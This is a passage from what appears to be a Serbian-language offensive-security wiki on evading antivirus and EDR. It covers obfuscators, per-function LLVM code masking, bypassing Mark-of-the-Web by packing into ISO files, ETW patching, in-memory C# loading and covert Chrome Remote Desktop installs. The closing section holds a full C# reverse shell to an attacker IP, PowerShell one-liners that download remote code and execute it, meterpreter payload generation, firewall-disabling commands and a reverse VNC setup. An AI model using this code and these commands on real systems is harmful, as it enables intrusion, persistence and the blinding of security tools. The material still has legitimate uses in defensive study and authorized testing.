> 🛈  ConfuserEx kreira prilagođeni atribut pod nazivom `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijska komanda
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork LLVM paketa za kompajliranje koji pruža veću bezbednost softvera putem [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako se jezik `C++11/14` može koristiti za generisanje obfusciranog koda u vreme kompajliranja, bez upotrebe eksternih alata i bez izmene kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfusciranih operacija, generisanih pomoću C++ template metaprogramming framework-a, što otežava posao osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscira različite PE datoteke, uključujući .exe, .dll i .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan mehanizam za metamorfni kod namenjen proizvoljnim izvršnim datotekama.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za detaljnu code obfuscation u jezicima koje podržava LLVM, a koristi ROP (return-oriented programming). ROPfuscator obfuscira program na nivou asemblerskog koda tako što obične instrukcije pretvara u ROP lance, narušavajući našu uobičajenu predstavu o normalnom toku izvršavanja.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL datoteke u shellcode, a zatim da ih učita.

### Samo-maskiranje po funkciji uz pomoć LLVM kompajlera

Umesto da se maskira ceo implant samo dok je neaktivan, izmenjeni LLVM X86 backend može da drži odabrane funkcije XOR-maskirane kad god nisu aktivne. Function Peekaboo PoC bira demanglovana imena koja sadrže `REG_`, ubacuje position-independent ulazne/izlazne stubove oko konačnog mašinskog koda i emituje jedan zajednički handler za maskiranje u `.text`; potpisi na nivou izvornog koda i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacija toka izvršavanja u backend-u

Ovo treba da se izvede nakon izbora instrukcija i optimizacije, jer transformacija mora da obuhvati **svaki emitovani return** i da zna tačan x86 raspored. `MachineFunctionPass` pre emitovanja pronalazi poslednji `MachineInstr::isReturn()`, briše ga kako bi se završna putanja nastavila do dodatog epiloga, a ranije return instrukcije zamenjuje sa `JMP_1 handler`. Zadržite svako uklanjanje stack/frame podataka koje je kompajler generisao pre svakog return-a; preusmerite samo samu return instrukciju.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `X86AsmPrinter::emitFunctionBodyEnd()` emituju stubove za pojedinačne funkcije, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju da grana u prologu cilja kasniji epilog; za ručno emitovani near `je`, upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi do handler-a mogu se umesto toga emitovati kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za funkciju koja nije izabrana, ako ništa nije promenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metapodaci i inicijalizacija pre CRT-a

PoC smešta XOR ključ i zapise od 16 bajtova, koji sadrže pokazivač na funkciju na koji je loader izvršio relokaciju, kao i dužinu u vreme izvršavanja, u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD vrednosti na pomeraju `+8` u zapisu, čime obuhvata dužinu i njeno dopunsko polje, i prelazi na sledeći zapis u koracima od `0x10`. Nazivi PE sekcija zauzimaju samo osam bajtova, pa runtime pretraga vidi `.funcmet`. Eksterni patcher dodaje izvršnu sekciju `.stub`, čuva stari RVA entry-point-a u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija bazu slike iz `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ imports kako bi pronašao već uvezeni `VirtualProtect` i pokreće se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metapodataka. Trajno čitljiv prolog beleži početak funkcije u `gs:[0xF0]`, prepoznaje sentinel i preskače telo koje je još uvek dešifrovano. Epilog zatim koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), povratna adresa na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen zapis metapodataka. Stub briše sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom uobičajenog poziva, prolog poziva isti simetrični handler kako bi dekodirao telo. Završna putanja se nastavlja do dodatog epiloga, dok svaki raniji return skače pravo do zajedničkog handler-a. Uobičajeni epilog takođe koristi `jmp handler` umesto `call`, pa nakon ponovnog maskiranja `ret` u handler-u preuzima povratnu adresu prvobitnog pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva za maskiranje i indikatori za analizu

Handler pronalazi tekući zapis, preskače fiksni vidljivi prolog (u ovoj verziji dugačak `0x46` bajtova), menja ostatak u `PAGE_EXECUTE_READWRITE`, XOR-uje ga bajt po bajt koristeći niži bajt ključa, a zatim ga postavlja na `PAGE_EXECUTE_READ`. Ista petlja zato dekodira pri ulasku i kodira pri svakom uobičajenom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori ovog dizajna koji pružaju snažan signal uključuju:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point unutar izvršne sekcije `.stub` i sekciju `.funcmet` koja sadrži ključ i relokovane pokazivače na `.text`;
- PEB, import-table i section-table parsiranje pre CRT-a, nakon čega slede pozivi preko svakog pokazivača iz metapodataka;
- identične `call`/`pop` PIC prologe i brojne return lokacije preusmerene na jedan handler;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, nakon kojih slede ponovljeni `VirtualProtect` prelazi i bajt-po-bajt XOR upisi u izvršne stranice koje pripadaju slici.

Ovo je izbegavanje memorijskih skenera, a ne kriptografska zaštita: zakrpljena datoteka i dalje sadrži prvobitno dešifrovano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i sačuva aktivnu funkciju. Jednobajtni XOR, čitljivi metapodaci i fiksna granica `0x46` takođe olakšavaju offline oporavak.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slotovi u PoC-u su lokalni za thread, ali izmenjene code stranice važe za ceo proces. Zato istovremeni ili rekurzivni ulasci mogu ponovo da preklapaju instrukcije dok ih drugo izvršavanje koristi; izuzeci i nenormalni izlazi takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje prelaze, obnovi zaštitu koju je zaista vratio `lpflOldProtect`, izbegava hard-kodirane dužine stub-ova, proveri poravnanje x64 stack-a za putanje `call` i `jmp` i pozove `FlushInstructionCache` nakon ponovnog upisa izvršnih bajtova. Microsoft izričito navodi da je pozivalac odgovoran za usklađenost instrukcijskog keša kada se izvršni kod menja.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen i MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih datoteka sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjih korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom koristi pristup zasnovan na reputaciji, što znači da će aplikacije koje se retko preuzimaju aktivirati SmartScreen i upozoriti krajnjeg korisnika, sprečavajući ga da pokrene datoteku (mada se datoteka i dalje može pokrenuti klikom na „Više informacija” -> „Ipak pokreni”).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) naziva Zone.Identifier, koji se automatski kreira prilikom preuzimanja datoteka sa interneta, zajedno sa URL-om sa kog je datoteka preuzeta.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za datoteku preuzetu sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršne datoteke potpisane **pouzdanim** sertifikatom za potpisivanje **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih spakujete u neku vrstu kontejnera, kao što je ISO. To je zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer upotrebe:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a u ISO datoteke pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za beleženje događaja u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **beleže događaje**. Međutim, bezbednosni proizvodi mogu da ga koriste i za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično tome kako se AMSI onemogućava (zaobilazi), moguće je i podesiti da funkcija **`EtwEventWrite`** procesa u korisničkom prostoru odmah vrati kontrolu bez beleženja događaja. To se radi zakrpom funkcije u memoriji tako da odmah vrati kontrolu, čime se efektivno onemogućava ETW beleženje za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i još uvek predstavlja odličan način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će se payload učitati direktno u memoriju, bez upisivanja na disk, trebaće nam samo da zakrpimo AMSI za ceo proces.

Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava izvršavanje C# assembly datoteka direktno u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

Podrazumeva **pokretanje novog žrtvenog procesa**, ubacivanje zlonamernog post-exploitation koda u taj novi proces, njegovo izvršavanje i, kada se završi, gašenje novog procesa. Ovaj pristup ima i prednosti i nedostatke. Prednost metode fork and run je što se izvršavanje odvija **izvan** procesa našeg Beacon implant-a. To znači da, ako nešto pođe po zlu tokom post-exploitation aktivnosti ili bude otkriveno, postoji **mnogo veća šansa** da naš **implant preživi**. Nedostatak je **veća verovatnoća** da vas otkriju **bihevioralne detekcije**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ovaj pristup podrazumeva ubacivanje zlonamernog post-exploitation koda **u sopstveni proces**. Tako možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali nedostatak je što, ako nešto pođe po zlu tokom izvršavanja payload-a, postoji **mnogo veća šansa** da **izgubite beacon**, jer može doći do pada procesa.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly-je možete učitavati i **iz PowerShell-a**. Pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video S3cur3th1sSh1t-a](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Ponovno pakovanje .NET alata u NativeAOT WebAssembly (WasmForge)

Uobičajene `execute-assembly` tehnike zadržavaju prepoznatljiv MSIL i na kraju inicijalizuju CLR. **WasmForge** umesto toga menja osnovu izvršavanja: migrira C# projekat na eksperimentalni NativeAOT-LLVM WASI target, unapred ga kompajlira u WebAssembly i ugrađuje taj modul u Windows PE host zasnovan na Wazero-u. Rezultujućem procesu nisu potrebni CLR, JIT niti `dotnet` host na ciljnom sistemu, pa pravila zasnovana samo na nazivima upravljanih assembly-ja, učitavanju CLR-a, AMSI-ju ili .NET ETW-u nemaju direktan uvid. Ovo je tehnika za izbegavanje detekcije i pakovanje, a ne zaobilaženje granice privilegija — gost zadržava dozvole i ponašanje originalnog alata koje operativni sistem može da uoči.<sup>[[44]](#references)[[45]](#references)</sup>

### Izgradnja C# projekta

Preporučeni način izgradnje je Docker okruženje projekta, jer ono sadrži .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker i zavisnosti za potpisivanje. `.csproj` se automatski prepoznaje; jednokratna izgradnja obavlja migraciju, zakrpe kompatibilnosti, WASM kompilaciju, PE forging i potpisivanje.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Za otklanjanje problema ili pregled generisanog koda, podelite proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` i završni `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Slika za build takođe koristi omotač `wasm-component-ld` da bi izbegla kodiranje WASI Preview 2 komponente i proizvela običan modul koji očekuje ugrađeno runtime okruženje.<sup>[[44]](#references)[[45]](#references)</sup>

### Povezivanje wasm32 C# koda sa x64 Win32

Ovo nije transparentno ponovno prevođenje. NativeAOT-WASI nema neke funkcije BCL-a orijentisane na Windows ili ih menja, a wasm32 gost obično alocira četvorobajtne slotove za pokazivače, dok x64 API-ji mogu da vrate osmobaјtne pokazivače. WasmForge rešava oba problema pomoću sledećih generisanih slojeva:<sup>[[44]](#references)</sup>

1. Source patcher ispravlja semantičke razlike specifične za AOT i preusmerava nepodržane pozive za registry, pipes, WMI, identity, directory-service, file-version, LSA i slične funkcije na pomoćne funkcije `Wf*`.
2. P/Invoke skener generiše NativeAOT `DirectPInvoke` mapiranja, tako da se pozivi `[DllImport]` povezuju sa linkovanim C bridge simbolima, umesto da se deklarisana DLL dinamički učitava unutar gosta.
3. Pokazivači vezani za host koriste `ulong` u C# i `uint64_t` u C. Generički dispečer prosleđuje poziv Win32 rukovaocu na hostu; `out8_mask` označava stvarne osmobaјtne izlazne slotove čije gornje polovine treba sačuvati. Za neoznačene izlaze oblika wasm32 koristi se zaštita snapshot/restore, kako upis x64 sistema ne bi oštetio susedna četiri bajta.
4. Namenski host bridge-ovi obrađuju operacije koje ne odgovaraju generičkom syscall dispečiranju, kao što su pristup LSA kešu tiketa, Kerberos/BCrypt operacije sa strukturisanim rezultatima, TCP KDC saobraćaj i LDAP upiti.

Na primer, wrapper za `version.dll!VerQueryValueW` prosleđuje četiri host adrese i postavlja bitove 2 i 3 (`0xC`), jer su pokazivač vrednosti i dužina osmobaјtni izlazni slotovi. Sam wrapper ostaje generički i prosleđuje naziv DLL-a, naziv exporta, argumente i masku funkciji `wf_call_v2`; host obavlja prevođenje pokazivača i poziva nativni API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograničenja i tačke za preusmeravanje detekcije

Kod koji intenzivno koristi reflection, dinamičko učitavanje assembly-ja, proizvoljne native callback-ove i složene x64 strukture vraćene u WASM memoriju i dalje može zahtevati zakrpe za pojedinačne alate ili potpuno otkazati. Generički WASI Preview 2 socket-i mogu takođe da stignu do no-op stub-ova, pa podržani alati koriste host shim-ove specifične za protokol. Proverite svaku komandu u odnosu na native build, umesto da pretpostavljate da su funkcionalnosti iste.<sup>[[44]](#references)[[45]](#references)</sup>

Ova tehnika preusmerava telemetriju, umesto da payload učini nevidljivim. Detekcija se može preusmeriti na PE koji sadrži ili materijalizuje WASM modul, ponašanje nalik Wazero runtime-u, neuobičajenu alokaciju i kopiranje host/guest memorije, generički direktni Win32 dispatch, anomalije u potpisivanju i PE resursima, kao i na rezultujuće API pozive i mrežni saobraćaj. Zato odsustvo CLR-load, AMSI ili .NET ETW događaja ne treba smatrati dokazom da je proces bezopasan.<sup>[[44]](#references)</sup>

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod koristeći druge jezike tako što će se kompromitovanoj mašini omogućiti pristup **okruženju interpretera instaliranom na SMB deljenom resursu pod kontrolom napadača**.

Omogućavanjem pristupa binarnim datotekama interpretera i okruženju na SMB deljenom resursu možete **izvršavati proizvoljan kod napisan u tim jezicima u memoriji** kompromitovane mašine.

U repozitorijumu se navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, neobfuskovanih reverse shell skripti napisanih u tim jezicima pokazalo se uspešnim.

## WebAssembly re-hosting radi izbegavanja statičke analize

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliše access token-om bezbednosnog proizvoda kao što su EDR ili AV. Smanjenje privilegija token-a može ostaviti proces aktivnim, a istovremeno ga sprečiti da obavlja privilegovane radnje inspekcije ili sanacije.

Da bi se to sprečilo, Windows bi mogao da **spreči spoljne procese** da dobiju handle-ove za token-e bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je instalirati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole i održavanje perzistencije:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Pokrenite instalacioni program neprimetno na računaru žrtve (potrebna su administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite na Next. Čarobnjak će zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite navedenu komandu uz potrebne izmene: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).
 

## Napredno izbegavanje detekcije

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Izbegavanje detekcije je veoma složena tema; ponekad morate uzeti u obzir mnoge različite izvore telemetrije u jednom sistemu, pa je gotovo nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje na koje naiđete imaće svoje prednosti i slabosti.

Preporučujem da pogledate ovo predavanje autora [@ATTL4S](https://twitter.com/DaniLJ94) kako biste stekli osnovu za naprednije tehnike izbegavanja detekcije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno odlično predavanje autora [@mariuszbit](https://twitter.com/mariuszbit) o višeslojnom izbegavanju detekcije.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Zastarele tehnike**

### **Provera koje delove Defender prepoznaje kao zlonamerne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** dok **ne utvrdi koji deo Defender prepoznaje kao zlonameran**, a zatim će ga izdvojiti za vas.\
Još jedan alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred), a usluga je dostupna na otvorenom vebu na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet server**

Sve do Windows 10, uz svaki Windows je dolazio **Telnet server** koji ste mogli da instalirate (kao administrator) ovako:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Neka se **pokreće** pri pokretanju sistema i **pokrenite** ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port (stealth) i isključite zaštitni zid:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, ne setup)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarnu datoteku _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ na **žrtvu**

#### **Obrnuta konekcija**

**Napadač** treba da **pokrene unutar** svog **hosta** binarnu datoteku `vncviewer.exe -listen 5900` kako bi bila **spremna** da prihvati obrnutu **VNC konekciju**. Zatim, na **žrtvi**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, ne smete da radite nekoliko stvari

- Nemojte pokretati `winvnc` ako je već pokrenut, jer ćete izazvati [iskačući prozor](https://i.imgur.com/1SROTTl.png). proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu, jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć, jer ćete izazvati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Unutar GreatSCT-a:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite listener** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Aktuelni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga uz:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# pomoću kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Spisak C# obfuskatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
